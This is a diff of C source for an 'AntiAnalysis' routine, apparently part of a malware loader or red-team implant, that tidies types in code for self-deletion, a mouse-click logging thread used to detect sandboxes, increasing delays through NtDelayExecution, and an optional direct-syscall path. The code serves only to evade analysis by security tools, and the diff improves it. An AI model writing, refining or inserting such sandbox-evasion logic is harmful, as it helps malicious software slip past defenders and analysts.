@@ -1,18 +1,16 @@
 #include "anti_analysis.h"
 
 /* Global Variables */
-extern DWORD g_hMouseHook;
+extern HHOOK g_hMouseHook;
 extern DWORD g_dwMouseClicks;
 
 BOOL AntiAnalysis(DWORD dwMilliSeconds) {
     HANDLE hThread = NULL;
-    DWORD   dwThreadId = NULL;
-    NTSTATUS STATUS = NULL;
+    DWORD   dwThreadId = 0;
+    NTSTATUS STATUS = STATUS_SUCCESS;
     LARGE_INTEGER DelayInterval = {0};
     FLOAT i = 1;
-    LONGLONG Delay = NULL;
-
-    Delay = dwMilliSeconds * 10000;
+    LONGLONG Delay = (LONGLONG)dwMilliSeconds * 10000;
     DelayInterval.QuadPart = -Delay;
 
     // self-deletion 
@@ -26,7 +24,7 @@ BOOL AntiAnalysis(DWORD dwMilliSeconds) {
 
 #ifndef SW3_SYSCALL_ENABLED
         // Using Windows API
-        hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MouseClicksLogger, NULL, NULL, &dwThreadId);
+        hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MouseClicksLogger, NULL, 0, &dwThreadId);
         if (hThread) {
             DebugPrint("\t\t<<>> Thread %d Is Created To Monitor Mouse Clicks For %d Seconds <<>>\n\n", dwThreadId, (dwMilliSeconds / 1000));
             WaitForSingleObject(hThread, dwMilliSeconds);
@@ -75,7 +73,7 @@ BOOL AntiAnalysis(DWORD dwMilliSeconds) {
             return TRUE;
 
         // if not, we reset the mouse-clicks variable and monitor the mouse-clicks again
-        g_dwMouseClicks = NULL;
+        g_dwMouseClicks = 0;
 
         // increment 'i', so that next time 'DelayExecutionVia_NtDE' will wait longer
         i++;
